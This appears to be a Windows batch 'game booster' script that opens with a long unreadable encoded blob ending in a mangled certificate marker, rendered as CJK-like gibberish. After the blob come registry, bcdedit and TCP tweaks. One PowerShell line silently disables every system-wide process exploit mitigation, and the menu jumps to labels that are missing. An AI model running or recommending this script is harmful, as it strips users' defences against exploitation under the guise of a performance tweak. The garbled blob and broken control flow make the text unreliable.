癎浢灚祚癁浚ㅸ㉣歨湢杍兄異塚穒䍡灂湢村਍䝤睎䡉汊㉣ざ䅉䬰浢ざ㉣杧㉤畬㉣樹祡祂塚汎䍤乁浃氵䡤潎䝉畬䝤祖浚橆਍博あ㍙杁㉣ざ䝉獤㉢桊䍢桂塤癒䡤畖坡渵坐瘵浢杕兄橰䡢杍兄湰㍢癒橏䍊਍塚村兄㙯歍汊䍤乁楃杧兄穰祙橂㉢洵坡杣歉䩊䙖楍䡉ぎ塙お卐桂塤癒䅉䬰਍㉣杍㍣桒湣村歉䩊䙖楍䅉䬰浚礹䍉洹䍉お㉢汴湢㥍祍杉半桖䝉畬䍉湧㉣杍਍塣汖湣汬䍥楁歑啬祕杉湘杷浚畬䡚ぎ楣楁䕕䕬楉灣䝉癒䍉穨塚村䝣歬卐汕਍卙杫兄灯䑉电坤杷橍洴卍乁湃瑤坡杍䡣癊㉙穖祣㍂䝡祖博兂浣樹塚穎坓㥑਍塊灂䍚杕け䵆䍔穂塚睒浣癬浣ぬ卥楁䝡湬䍡杉兄潯䅉䬰㉣杍㉙甹浚湬䍉䕊਍湢橎坙潎博杉㍣桒湣㥑䝉汒坢畆䍚乁湃橎䡉ぎ塙お䍉䕊湢橎坙潎博杉兄浰਍㍢杉㉌杙湉癒㉡畖穣稰楉汁坊杅坡朴䍋穤祙硂坤祖坥㑖䍉䕊湢橎坙潎博杉਍湘杷浚畬䡚ぎ楣楁䕕䕬楉灣䝉癒䍉穨塚村䝣歬卐汕卙杫兄灯䑉电坤杷橍洴਍卍乁湃瑤坡杍䡣癊㉙穖祣㍂䝡祖博兂浣樹塚穎坓㥑塊灂䍚杕け䵆䍔穂塚睒਍浣癬浣ぬ卥楁坡獒博杉兄橰䡢杍兄橰䡢杍兄㍰坢橬䡉祂㉢汎㍣杍㉤汨浣杕਍浢瑆呚椰塢穆浤畍塚汨楉䑂啑䵸䡉汎䡤祂坡礹塡㕒䍉潊坡潤䡉祂坡礹塡㕒਍楉乁浃獎祣乁湃瑤坡杍䡣癊㉙穖祣㍂䝡祖博畂坙氱卐瑊塣湒㍣橚浌㑖博杉਍け䵆䍔穂塚睒浣癬浣ぬ卥楁䝡湬䍡睂浣癬浣ぬ卥杉兄橰䡢杍兄㍰坢橬䡉祂਍㉢汎㍣杍㉤汨浣杕浢瑆呚椰浒㉬啚昱ㅒ䉒䡕癊㉙穖祣氵䝥楕䕉䉎䕔杷㉣ざ਍䡣灊㍢灊䡤杫浉灨㉚杧䡣灊㍢灊䡤楫䅉䬰㉙穸䅉䬰㉤瀱祙睂浣樹塚穎䡉潤਍塚汊䝉栵坢㥕湉㉎㉙癨㍣畑塚汨楉䑂啑䵸䡉汎䡤祂坡礹塡㕒䍉潊坡潤䡉祂਍坡礹塡㕒楉乁浃獎祣乁湃瑤坡杍䡣癊㉙穖祣㍂䝡祖博畂坙氱卐坊坡氱㉖礹਍䝢畑塚汨楉䑂啑䵸䡉汎䡤祂坡礹塡㕒䍉祊坚獆䝤瑬博杉兄橰䡢杍兄䙰け偨਍䑉⬴䙉䡎ㅘ灚㍣桒ㅘ橒䕣睬ㅘ桂䝤潎湌汊祚扂䕓䙴噗䴹ご䉎䙔丹啑䥎啓䘵਍䙘婎ㅕ䙒噔䑸塤祊坚〵㉑甹䡤癊䙢汎䙤呸塚㉊坡汎ㅣ瑸㍢橖䝢穆ㅣ典塙桊਍坢ざ塚穊単乁歃䑖䕓朸橐朴さ晤浖穬䝤晆䝖睎塓時䝕う㉙畧浣湖䍉乊㍢穖਍啚桒䝤剆坤ㅖ噚灎浥楕坐㍒㍢歊橏睁䑍睁䑍汊䅉䬰啒䥎祔⭁楐呂ㅒ圹塡ぎ਍噙唹㍙䩂䙣儹塙橒䍡礵坚杣汉睤䙣汊㉙礹䝚祖ㅘ祒坙汎㍒灖䍚㥉湉浴穙歨਍橚浨䍚欱呍ㅁ呌睑呙瑫坙㍙华礰坚橖橍に坙浒䝏㥒楉乁歃䑖䕓朸橐朴さ晤਍浖穬䝤晆䝖睎塓時䝕う㉙畧浣湖䙉䥴こ婖じ偸け䵆じ䈱け䩨歔捖ㅕ呬䕖乖਍䕘ㅎ湣汊湢䑒㉢〵浣猹㉕ざ䙘汎湣灚㉙穖䝘楴䝚獎塙穎䙘桂浣瑆塚汒湣摎਍䅉䬰啒䥎祔⭁楐呂ㅒ圹塡ぎ噙唹㍙䩂䙣儹塙橒䍡礵坚杣歉汴坥癊塙歊䝒う਍噙ㅆ塚汖㉕㙬博㥉䡚癤浣㙑䑍睁䑍睁浍杕兄䙰け偨䑉⬴䙉䡎ㅘ灚㍣桒ㅘ橒਍䕣睬ㅘ桂䝤潎湌汊祚楁㉑甹浢橖䕤ㄱ䡢灒䝣汸䝕礹䡤楍坐㍒㍢歊橏睁䑍睁਍䑍睁䅉䬰啒䥎祔⭁楐呂ㅒ圹塡ぎ噙唹㍙䩂䙣儹塙橒䍡礵坚杣歉汴坥癊塙歊਍䝒㉖坡汎浑穆啚栵坢楕卐䱊塚楬㉢祆䕚獎塙穎楉乁歃䑖䕓朸橐朴さ晤浖穬਍䝤晆䝖睎塓時䝕う㉙畧浣湖䍉乊塙灨塢瑖䝕礹䡤呎塚㉊坡汎䍚㥉䡚癤浣㙑਍䑍睁䑍睁䑍杍兄䙰け偨䑉⬴䙉䡎ㅘ灚㍣桒ㅘ橒䕣睬ㅘ桂䝤潎湌汊祚楁㉕畖਍䕚ㄹ䡤ㅂ䙤癒坑獸䝕礹䡤楍坐㍒㍢歊橏睁䑍睁䑍硁䅉䬰啒䥎祔⭁楐呂ㅒ圹਍塡ぎ噙唹㍙䩂䙣儹塙橒䍡礵坚杣汉睤䙣汊㉙礹䝚祖ㅘ祒坙汎㍒灖䍚㥉湉睳਍呏㑉坍硙楚洱橎汚呌㑑坎瑅呏桬楍㔰呍穙䝏㍙䑏橊䑎㥬楉乁湃汊㉚歖塡村਍㍌杍さ晤浖穬䝤晆䝖睎塓時䝕う㉙畧浣湖䅉䬰䝚獖䙉䡎ㅘ灚㍣桒ㅘ橒䕣睬਍ㅘ桂䝤潎湌汊祚乁浃獎祣乁浃癤䝤㘸啎汊䍤乁橃ㅯ浑ざ䅉䬰浢ざ㉣杧坡〵਍䡉橒䍣穂塚村㍣睖䝣汸坢畖䝤獆䡉汒塢獂塙汒坐ㅎ㍣癒卢灂㍙㥣呍杕兄印਍坚畣塚汨䝉歆䍚楁䕓䙴噗䐹噖半啒唵ㅘ呖噒捊㉑甹䡤癊䍢兂坙氵䙢䕸塚牎਍䝤眹楉癁楤楁㉑祆塚啒坡氱㍢ざ楉癁䍤卂啒晤䙒偤歕村㉌村橉睅䑍楁䍉洹਍䅉䬰浕湖浌㑖博桂䝚村歉䱨噒晬ㅑ卖歕佖䙖嘹さ卖䕘癎湢祒㉢杷䝕畆坚捸਍䝒穖㍡癒䍣杉㍌杙歉癸つ汸浤獖䝓瘹㍡啎坡氱㍢ざ楉癁䍤卂啒晤䙒偤歕村਍㉌村橉睅䑍楁䍉洹䅉䬰浚礹䍉洹䍉ㅊ㉣楖坙牎卣杉半灖䝉畬䍉杨浣湖䡉ㅆ਍塚㕊䕉䱨噒晬䕔䐹啑晸啔䑆䕓佬噒呸噗啎啒挱㍑祖浣畖䕤癎湢祒㉢呸塚捒਍㉕祖浤橬塚捎䝖睎塡捂䝕祆坙氱䝤祖ㅣ䩸湢汒浣桚㉙穖䍙杫䝚朸䍋乁汃汊਍祚氵䝥杕坙歒䍉汕卡癁楤楁䕖兎浔䔹坚桸卥杉㉌村橉楅䍉〹䙉䙊ㅒ䔹ざ匹਍䍒癁楚乁汃汊祚氵䝥杕坙歒䍉汕卡癁楤楁䝖睎坑牎湒汊塣汖浢㕎楉癁䍚楁਍祍杉㍌村歕䡖じ塒ㅔ䕊䍉洹䅉䬰浕湖浌㑖博桂䝚村半灖䍉㈹䍉啊ㅑ䕂坚䉸਍㉙啴坡牎祣杉㉌村橉楁䍉〹䙉䙊ㅒ䔹ざ匹䍒癁楚乁楃杫䅉䬰㉤瀱祙睂浣樹਍塚穎䡉潤塚汊䝉栵坢㥕浉桰浤㍆浌㑖博杉け䵆䍔穂塚睒浣癬浣ぬ卥楁䝡湬਍䍡睂浣癬浣ぬ卥杉兄㍰坢橬䡉祂㉢汎㍣杍㉤汨浣杕浢瑆呚椰浖瑬噚癤浣歸਍浌㑖博杉㉑獆䍢穂塚睒浣癬浣ぬ卥楁䝡湬䍡睂浣癬浣ぬ卥杉兄異塚穒䍡灂਍湢村䝤睎䡉汎䍤湂䝢椹坙杷浚穆䝤眹坚㤴坚栵浙汸䍚乁浃氵䡤潎䝉畬䍤あ਍㍙杁㉣ざ䝉獤㉢桊䍢あ坡氱㍣桒塢穂坐灒㉣楆䝢歖㍣桒湣村㉙欱浌㑖博癁਍祡睂坡渵䍉硁橍畣䍍眴橌杅䍉〱䍉猱坌朴呏睧䑍杁兄異塚穒䍡灂湢汒浣桚਍㉙杕塡㉂䍎穂塚村㍣楖坡〵塚浊坙汎䍉塊卡䜱卡杉塢ㅒ卐乖䙖汕䡉ぎ㍢汊਍塐求湣灎㍣汒湢村兄㍰坢橬䡉祂㉢汎㍣杍㉤汨浣杕浢瑆呚椰㍣橚䝡稹䍤氵਍䝥楕䕉䉎䕔杷㉣ざ䡣灊㍢灊䡤杫浉灨㉚杧䡣灊㍢灊䡤楫䅉䬰浢ざ㉣杧坡氵਍䡉橒䍣穂䝡㌹䝉獤㉢桊䍢乁浃氵䡤潎䝉畬䝤祖浚橆博灂䡣す䡉汎䍤灂湢汒਍浣桚㉙杕歉畖䝤汨浣氵䍤杉塢ㅒ呐ぅ呎杁兄㍰坢橬䡉祂㉢汎㍣杍㉤汨浣杕਍浢瑆呚椰浖瑬噚癤浣歸浌㑖博杉け䵆䍔穂塚睒浣癬浣ぬ卥楁䝡湬䍡乁浃氵਍䡤潎䝉畬䝤祖浚橆博灂䡣す䡉汎䍤穂坤灊湢汒浣桚㉙杕汉灤啌灚楉瑂䡤㥕਍啊唱卖杕㍣癒浣㥕䝣祖㉣穬䝤畖䍤乁浃氵䡤潎䝉畬䍤あ㍙杁㉣ざ䡉ㅎ䡣獂਍坚氱湢桒䍢橂塤ぎ㉢朰㉙甹㉚穖䝤癬湢祂㍢灚䝚祖坐ぎ㍙杁兄異塚穒䍡灂਍湢村䝤睎䡉汎䍤湂䝢椹坙杷坡瀵䝤桬䙢お穢砰呎睕䅉䬰浢ざ㉣杧坡〵䡉橒਍䍣穂塚村㉚癸浙獆䡉穊穙氱浢楆䝢歖䅉䬰浢ざ㉣杧坡〵䡉橒䍣穂塚村㉚癸਍浙獆䝉氵䝤瑒呙欱塡桎浙汸䍚乁浃氵䡤潎䝉畬䍤あ㍙杁㉣ざ䝉獤㉢桊䍢瑂਍塙穨坥礵塚祒坙稵坢穬㉣癬湢㥍䍎乁浃獎祣乁歃䑖䕓朸橐朴さ晤浖穬䝤晆਍䝖睎塓時䝕う㉙畧浣湖䙉䥴こ婖じ偸け䵆じ䈱け䩨歔捖ㅕ呬䕖乖䕘ㅎ湣汊਍湢䑒㉢〵浣猹㉕ざ䙘汎湣灚㉙穖䝘瘱坤獎塙穎䙘桂浣瑆塚汒湣摎䅉䬰啒䥎਍祔⭁楐呂ㅒ圹塡ぎ噙唹㍙䩂䙣儹塙橒䍡礵坚杣歉瘱塤汎䝒う噙ㅆ塚汖㉕㙬਍博㥉䡚癤浣㙑䑍睁䑍睁橍杉兄䙰け偨䑉⬴䙉䡎ㅘ灚㍣桒ㅘ橒䕣睬ㅘ桂䝤潎਍湌汊祚楁㍖睂浕橖㍢歊塚晊䡖桊㉙䡖坤歬橉椰㉥橚䝏浒䝏歚坌硑䑍瑕䑎桂਍协栱橚ㅣ呌汊坚祍呏桒䝚㑙䡚椰䅉䬰啒䥎祔⭁楐呂ㅒ圹塡ぎ噙唹㍙䩂䙣儹਍塙橒䍡礵坚杣し䱨噒晬䕔䐹啑晸啔䑆䕓佬噒呸噗啎啒挱㍑祖浣畖䕤癎湢祒਍㉢呸塚捒㉕祖浤橬塚捎㉡歊㉙桸㍣捎䝕祆坙氱䝤祖ㅣ朰兄䙰け偨䑉⬴䙉䡎਍ㅘ灚㍣桒ㅘ橒䕣睬ㅘ桂䝤潎湌汊祚楁㉓㕖浙根浣䕒塙桒塕汖坤呖塡汰橉欱਍㉤礹䑚睯䑍睁䑍祁楍乁歃䑖䕓朸橐朴さ晤浖穬䝤晆䝖睎塓時䝕う㉙畧浣湖਍䍉䑊㉢电坚ぎ塔獖䝤睬䝢兖㍢お祣㥉䡚癤浣㙑䑍睁䑍睁䑍杁兄䙰け偨䑉⬴਍䙉䡎ㅘ灚㍣桒ㅘ橒䕣睬ㅘ桂䝤潎湌汊祚楁㉓㕖浙根浣䕒塚灚㉙䍖塙汎浔瑆਍博㥉歉汴坥癊塙歊㉑桸㍣楍䅉䬰啒䥎祔⭁楐呂ㅒ圹塡ぎ噙唹㍙䩂䙣儹塙橒਍䍡礵坚杣歉栱䝥瑬坤儱㍢おㅣ汎湣灚㉙歖橉欱㉤礹䑚睯䑍睁䑍睁祍乁歃䑖਍䕓朸橐朴さ晤浖穬䝤晆䝖睎塓時䝕う㉙畧浣湖䍉告坚欵㍔ざ䡣ざ䝖䈹䝢典਍㍢お祣㥉䡚癤浣㙑䑍睁䑍睁䑍杅兄䙰け偨䑉⬴䙉䡎ㅘ灚㍣桒ㅘ橒䕣睬ㅘ桂਍䝤潎湌汊祚楁㍖睂浕橖㍢歊塚晊䡖桊㉙䡖坤歬橉椰穥㕁橍硧橚浆坌㉙济瑕਍䑎ㅧ卙㔰坏祅呌硫橎㑍橚㑣浍き塏椰䅉䬰浣湖坚灒䍤癁祣呂ㅒ圹塡ぎ噙唹਍㍙䩂䙣儹塙橒䍡礵坚杣兄歰坚杷さ晤浖穬䝤晆䝖睎塓時䝕う㉙畧浣湖䅉䬰਍㉙穸䅉䬰㉚〹穢䕰塡杁兄㙯䝒睬䅉䬰㉙穸䅉䬰坚潎祢療浚杙兄兰㍢汤汣潎਍坚獸浌㑖博呂塚瑑浔ざ䕖兎㉕ざ䝤畬祚瑁㉕ざ䝤畬ず栵坢杕坓〵塚畊塚䑒਍塤ぎ㉢朰啌瘵汢桎㉙却䡤卒塚灎䝢汬浢㕎䝉灒㉣楆䝢歖䅉䬰䝕㌹塚告䝡獖਍䍢氵䝥杕㉕ざ啌氵䙤䑒䙕汎䡤灒浢杣噌汎䡤灒浢佤坙氱䕉畬䝤祖浢ざ㍑穖਍䝤琹䍉丱塙周坥匵塚祒坙稵坢穬㉣癬湢杍楍乁汃療㉤祖㉕汨䝢畷塚汨䙉汎਍䍤伱塚啒ㅑ呂塚げ坡渵䍉吱塚げ坡渵浔瑆博䩂湢汒浣氵䕤ㅎ㍣癒卢瑁坒畎਍㉑睆坙灊䝢ぬ卥歂塡桎浙汸䍚乁汃療㉤祖㉕汨䝢畷塚汨䙉汎䍤伱塚啒ㅑ呂਍塚げ坡渵䍉吱塚げ坡渵浔瑆博䩂湢汒浣氵䕤ㅎ㍣癒卢瑁䝖瑬塚ぎ坙眱祣歂਍塡桎浙汸䍚乁汃療㉤祖㉕汨䝢畷塚汨䙉汎䍤伱塚啒ㅑ呂塚げ坡渵䍉吱塚げ਍坡渵浔瑆博䩂湢汒浣氵䕤ㅎ㍣癒卢瑁塑ざㅢㅒ浢畬ず汸浤獖䝔樹坙杷浔礹਍坢獆䅉䬰䝕㌹塚告䝡獖䍢氵䝥杕㉕ざ啌氵䙤䑒䙕汎䡤灒浢杣噌汎䡤灒浢佤਍坙氱䕉畬䝤祖浢ざ㍑穖䝤琹䍉吱㉙獆坡渵䝓ㅖ浣穬䝤橬祣歂塡桎浙汸䍚乁਍汃療㉤祖㉕汨䝢畷塚汨䙉汎䍤伱塚啒ㅑ呂塚げ坡渵䍉吱塚げ坡渵浔瑆博䩂਍湢汒浣氵䕤ㅎ㍣癒卢瑁㉑甹㉚穖䝤癬汢祂㍢灚䝚祖䝉ぎ㍙杁兄異塚穒䍡灂਍湢村䝤睎䡉汎䍤湂䝢椹坙杷塙ざ㍢ㅒ浢畬㉚汸浤獖塐汊㍣祒坡ぎ坚村兄異਍塚穒䍡灂湢村䝤睎䡉汎䍤湂䝢椹坙杷㉙灨坢氵呥氱浢楆䝢歖䅉䬰浢ざ㉣杧਍坡〵䡉橒䍣穂塚村㉚癸浙獆䝉橒呙氱浢楆䝢歖䅉䬰浢ざ㉣杧坡〵䡉橒䍣穂਍塚村㉚癸浙獆䝉氵䝤瑒呙欱塡桎浙汸䍚乁浃氵䡤潎䝉畬䍤あ㍙杁㉣ざ䝉獤਍㉢桊䍢橂㉢渵塚ぎ坡甹䡣癊浤歬塚㥉㍙橒䍣乁浃氵䡤潎䝉畬䍤あ㍙杁㉣ざ਍䝉獤㉢桊䍢求㉙樵塙桂浙獬塡㕒坐灒㉣楆䝢歖䅉䬰浢ざ㉣杧坡〵䡉橒䍣穂਍塚村䝡ㅖ浣穬䝤橬祣歂塡桎浙汸䍚乁浃氵䡤潎䝉畬䍤あ㍙杁㉣ざ䝉獤㉢桊਍䍢祂㍣㥍坚栵浙汸䍚乁浃氵䡤潎䝉畬䍤あ㍙杁㉣ざ䝉獤㉢桊䍢浂塙ぎ㍢求਍橢氱浢楆䝢歖䅉䬰浢ざ㉣杧坡〵䡉橒䍣穂塚村㉚癸浙獆䡉灒坢穖䝤瑆䡣㥍਍䝚穬坙獊坚村兄異塚穒䍡灂湢村䝤睎䡉汎䍤湂䝢椹坙杷浢甹㉣橆㍡お䡤汊਍㉣獬坡畖㍙㥫䝚穬坙獊坚村兄異塚穒䍡灂湢村䝤睎䡉汎䍤湂䝢椹坙杷湣橎਍坐畖坙獊坚村兄異塚穒䍡灂湢村䝤睎䡉汎䍤湂䝢椹坙杷坢㑆㍣畬浣ざ浣畆਍㉣瀱㍣灎㉢稵呐杉兄異塚穒䍡灂湢村䝤睎䡉汎䍤湂䝢椹坙杷坡瀵䝤桬䙢お਍穢礰䑍睁䅉䬰浢ざ㉣杧坡〵䡉橒䍣穂塚村㍣睖䝣汸坢畖䝤獆䡉汒塢獂塙汒਍坐ㅎ㍣癒卢灂㍙㥣呍杁兄楰㉙汒䝚ぬ䍉欹坚汸䝤㉖坙ㅸ博ㅂ㉣睖䝢う浚礹਍坢獎㉢牎䅉䬰㉣杍㉙甹浚湬䍉䍊噓呒楉穂䝤祆䑤朰塙ざ祢乁湃橎䡉ぎ塙お਍䍉䍊噓呒楉乁浃癚楣癁楚楁䝤爹坚稵呐楍䍉汕卙灂楢潁㍊橎䡉ㅆ塚㕊塚杧਍歉䩊䙖楍䙉㠵䝉灚浢穒䡤杉汉䩂䍒湉卋歂祢潁㉣ざ䡉灂䑚氰坊灅䅉䬰卋⭁਍湢獖䑉⭉橊杅兄㍰坢橬䡉祂㉢汎㍣杍㉤汨浣杕䡕癊㉙穖っ歬卐睖坡汑䕉䉎਍䕔杷㉣ざ䡣灊㍢灊䡤杫浉歬䝢楕䅉䬰㉤瀱祙睂浣樹塚穎䡉潤塚汊䝉栵坢㥕਍浉砱㍣橚浌㑖博杉け䵆䍔穂塚睒浣癬浣ぬ卥楁䝡湬䍡睂浣癬浣ぬ卥杉兄㍰਍坢橬䡉祂㉢汎㍣杍㉤汨浣杕浢瑆呚椰塢う㍚㉎祙氵䝥楕䕉䉎䕔杷㉣ざ䡣灊਍㍢灊䡤杫浉灨㉚杧䡣灊㍢灊䡤楫䅉䬰㉚〹祢䡂㉢卒坙爵浚㑬䅉䬰歏癤䙚桊਍浢浴塡杧兄䅰坚潎祢療浚杙兄穰塚村湉桂浣瑆穣氰楋杉兄橰䍚癁䍚楁塊欵਍䑣楁䍉浙䍉杧坡杙塚灨㍣村楉ざ坚眱噊湸塚桒䝚瀱楢㈵湙楍䝉汒䍢楁塊汒਍塢汁䝘汤䝤歆坢畬湌楚祣杉卋流楊浂㍣ざ坡杷䝚祬䡤杫塣汖湣杫塊㕎㍣汒਍坢祒塡汚半硁浐ㄵ䍢祁浐ㄵ䍢㡂䍦潁䍉求㉙癨䙉汎䍤噂啑杍卐䑂浣桖䝤偖਍浙汰㍙敒䍋告䝡獖䍢䈵䡣獂坡桎䝤癬楢敊卋㙁䙉䉖祑吵䝡獖䕢㑖坚ㅎ䝤杕਍浉瑎䍚氵䝥楕䍌楁㉌杳㉙村楉汉湦歎䑣楁楉流楊汁湦睍䍉睖塙桊塢汍楉杷਍楉獉䍉祊坤栵祣獉䑉杅橐朴楉ざ坚眱噊湸塚桒䝚瀱楢㈵湙楍䍉浙䍉汉䝤瑖਍䍣捖㉚ざ坙瑒坡甴浤穊楉流楊求䝥ぬ䍉䌹䍉杫兄浰㍢杉㉌杷半桖䝉畬䍉硧਍穏㝅呍睁卋歂祢潁䅉䬰浙歎坚灒䍤癁㉣ざ䝉灒㉣楆䝢歖坥栵坢橬䝤橬祡㕂਍塚杍兄楰㉙汒䝚ぬ䍉稹塚村塤汎䝣桸䝤癚浣〱坡牎䡉汬祣乁浃橊䝚歖塡村਍㍌灒坢癖塤村䍍乁浃橊䝚歖塡村㍌汎䍤畂䍥療䡣癒塤村兄楰㉙汒䝚ぬ䍉稹਍塚村浙瘹䡤㑖䝉灒㉣楆䝢歖䅉䬰浙歎坚灒䍤癁㉣ざ䝉癊㍢瑒坚ㄵ䝣猹坡㕎਍䡉ぎ坙欵塙歊䅉䬰浙歎坚灒䍤癁㉣ざ䝉㕨䝣祖浤穬㍢獊塙畖㉙と塥求䝉洹਍楚乁浃橊䝚歖塡村㍌汎䍤あ䝣椱㉢〹坚〵浣眹卥䝂㍢橊啚灒㉣楆䝢杕兄楰਍㉙汒䝚ぬ䍉稹塚村塣灖塚楒㉢〹䡉汬祣乁浃橊䝚歖塡村㍌汎䍤㝂㉚癸浙獆਍㉣ざ䝤畬㍚㥎䝉ㅎ㍣癒呢硯橎睁䑍㉁祎あ湣汖䅉䬰浙歎坚灒䍤癁㉣ざ䡉湴਍䝢椹坙穸塚げ坡渵㍣朰㍙穖䝤琹橏㉅䑍睁䑍㕙䡉祒坤杕兄楰㉙汒䝚ぬ䍉稹਍塚村㉥獤㉢桊䡢汎䡤灒浢穤卦橂塤ぎ㉢㘰呍睙䑍睁橎杧䡤ㅊ博乁浃橊䝚歖਍塡村㍌汎䍤獂坡氵塙桊䝚祒塚穎呎杣㍔あ㍔ざ䅉䬰浙歎坚灒䍤癁㉣ざ䝉畬਍㍙汊塙汎塤汎湣桚䑉㉉䑏穑呎祍䍏乁浃橊䝚歖塡村㍌汎䍤浂塡穊䝤氱㉚楆਍塥汒䝣猹坡㕎䙉穖啚獆䍢乁浃橊䝚歖塡村㍌汎䍤桂浤瀹䝚癸㉤氱坢礹卥睁਍䑥睧䑍睁䑍杁兄楰㉙汒䝚ぬ䍉稹塚村浢猹㍢瑤坚朰块穖䅉䬰浙歎坚灒䍤癁਍㉣ざ䝉獆䝢㌹坚灒浢氱坢礹塥汎䡤灒浢穤䑉㑂䍍乁浃橊䝚歖塡村㍌汎䍤灂਍㉣猹塙汒䝚癎湢汒䡥村浔朸兄楰㉙汒䝚ぬ䍉稹塚村湤瑎䝢ㅆ浢潎䡤睬博偂਍浚杙兄灯䅉䬰け呸䅉䬰㉚〹穢䝰坡瀵㉣杧兄㙯浒畬塡潎䅉䬰坚潎祢䑂噖佒਍噒村㍕睖䝣礹䍤乁浃稱祚煁䙉ぎ塙お䕉婊䕉噎䕖䘵䅖䬰塚灨䍤乁橃橰䅉䬰਍㉣ざ䝢樹坙杷坚栵浙汸䝒獖塙汬䕚㑖䝣畆㉣癬楢乁橃㙯橏㙯橏㙯橏㙯橏㙯਍橏㙯橏㙯橏㙯橏㙯橏㙯橏㙯橏㙯橏㙯橏㙯橏㙯橏㙯橏㙯橏㙯橏㙯橏㙯橏㙯਍橏㙯橏㙯橏㙯橏㙯楏乁橃橰㉢癸汣祂坡〵䕉癎䝢礹䍉呂䡤杉䙉癳汢朰兄穰਍塚獒㉢桎䍢乁湃汎䍤楁穣氰橦楉䅉䬰㉙獆䍢㙁㉙猹㍢兊浣畬䙤桚楣汁卍穂਍䍉穕䅉䬰塚灨䍤癁楙乁橃橰㉢癸汣祂坡〵浖祆䍉䑂㉢癸楣杁㍕祒浖祆䍉扂਍㉌搵䅉䬰坡杙浢〹䝉汒浚畬坚村䕒䵖䝉桎䝢杷浏畬塡䑒㉢癸汣祂坡〵䅉䬰਍㉣ざ䝢樹坙杷坚栵浙汸䝒獖塙汬䕚㑖䝣畆㉣癬楢乁湃ㅂ㉣歨䍉朴兄湯楏乁਍浃歎䙉杷兄穰塚村湉㥍卉⭖楍楅䅉䬰橏杯䝖汨䡉灎浢獤博楂䝢畆祡獂坡氵਍䡉灤䝤灨楢あ䝡杕浚猹䝢㌹坡渵䕉佬䍋杫㉙桸塤汎䝉穬䝉祎塡灒㉙獆䍉朰਍䕒朸歔唹䙉䙊啔圹卒乁浃癚楣汁坊朴坡朴䙋椴楘乁汃椴卋歂祢潁䅉䬰䍉穂਍塚村湉㥍塉㙍䑘氰塊电䍘汕浦栴楉乁楃杁㉣ざ䍉穊卐穆楏㤸半⭖楢永塊电਍卉杉兄杯䡉汎䍤楁穣栰穣㙯卐汕浦㘴半⭖楢楅䅉䬰卋乁浃癚楣癁楚歂坚灸਍塢敎噐朴坚猹橘朰半穖䝉畬䍉楧塉桍楉杫䝚朸䍋乁楃杁坡杙楉楅䝉硖卤楁਍楉穂塚獒㉢桎䍢歂塡桎浙汸䝒獖塙汬䕚㑖䝣畆㉣癬楢乁楃杁坡杙半穖呐挱਍䍉杧兄杯䍉杁浚畬䡚ぎ楣癁呙汯橦杅楉椴䍉捊祊杉湢獖䅉䬰䍉杁䑉畸坤杷਍㉣ざ䍉眹䍉㥉啊䙒䍔汕䕒䵖半䕖啒汷楉乁楃杁卋求䡢汎䝉浬䍉汕穣㤰祌潁਍䅉䬰䍉杁䝉灚浢穒䡤杉㉌㙅塊破䍉畉楉楁祌挵祊杉湢獖䅉䬰䍉杁䑉畸坤杷਍㉣ざ䍉眹䍉㥉啊䙒䍔汕䕒䵖半䕖啒汷啊䙒䍔汕䕒䵖半杉兄杯䍉杫坚穸博潁਍䅉䬰䍉杁䑉樵㉢癸汣祂坡〵湌㑒䍤潁坚潎祢汁塊捎楌挵祊杫兄杯䍉杁浚畬਍䡚ぎ楣癁呙汯橦杅㉌㙙㉙猹㍢兊浣畬䍤〵䡥村楉椴䅉䬰䍉杁䑉畸坤杷㉣ざ਍䍉眹䍉㥉啊䙒䍔汕䕒䵖半䕖啒汷啊䙒䍔汕䕒䵖半䕖啒汷啊䙒䍔楕䅉䬰䍉灁਍䅉䬰卋乁浃浬䍉瀹䍉汉橦楍呐椰㉌椴䝉橖䝡漸䅉䬰䝣眹䍚乁浃㑖塡村㉌杉਍兄㙯坡瀵䕤癎䝢礹䡕灊湢村兄浰㍢杉㉌杙半䉖䝉畬䍉湧汉祂㉢眱䍤歁䍓浚਍㍢杉半䍖䝉畬䍉硧卋歂祢祂坚椰祊杫䝚朸㉣ざ䍉䕊啒㥷半䉖䍉汕卑杉兄㡯਍湢獖䑉椴塊汒塢汁䍘楣䡉汎䍤癁䍣楁卐椴䅉䬰㍣楖㍣村穊杯楉ざ坚眱半杉਍浐ㄵ䍢乁浃㑖塡村㉌杉兄乯歃汒䍢汁橦杁兄乯歃汒䍢汁橦杁兄乯歃汒䍢汁਍橦杁兄乯歃汒䍢汁橦杁兄㵯਍ⴭⴭ䔭䑎䌠剅䥔䥆䅃䕔ⴭⴭഭ
Reg.exe add "HKCU\Control Panel\Accessibility\MouseKeys" /v "TimeToMaximumSpeed" /t REG_SZ /d "150000" /f
PowerShell "ForEach($v in (Get-Command -Name \"Set-ProcessMitigation\").Parameters[\"Disable\"].Attributes.ValidValues){Set-ProcessMitigation -System -Disable $v.ToString() -ErrorAction SilentlyContinue}"
bcdedit -set disabledynamictick yes
bcdedit -set useplatformtick yes
ping -n 2 127.0.0.1>nul
REG ADD HKey_Local_Machine\System\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\ /v TcpAckFrequency /t REG_DWORD /d 0 /f

REG ADD HKey_Local_Machine\System\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\ /v TCPNoDelay /t REG_DWORD /d 0 /f

taskkill /f /im explorer.exe
chcp 65001
start explorer.exe
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\PriorityControl" /v "ConvertibleSlateMode" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\PriorityControl" /v "Win32PrioritySeparation" /t REG_DWORD /d "22" /f
echo shutdown ??
ping -n 2 127.0.0.1>nul
cls
echo 1 shutdown
echo 2 NO shutdown
SET /p choix="%%b[31m[%%b[33mWPARK%%b[31m]%%b[33m PRESS NUMBER USE  >  "
if %choix%== 1 Goto :shd
if %choix%== 2 Goto :Question
Echo Enable Gamemode
goto boost
ping -n 4 127.0.0.1>nul
timeout 10
goto menu
:Question
chcp 65001
cls
title Question
echo Boost windows 11?
ping -n 2 127.0.0.1>nul
echo windows 11 onlY!!!!!!!!
ping -n 2 127.0.0.1>nul
goto win11


:GameModeoff
cls
title Gamemode off
pause
cls
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\PriorityControl" /v "ConvertibleSlateMode" /t REG_DWORD /d "0" /f
ping -n 2 127.0.0.1>nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "SystemCacheDirtyPageThreshold" /t REG_DWORD /d "0" /f
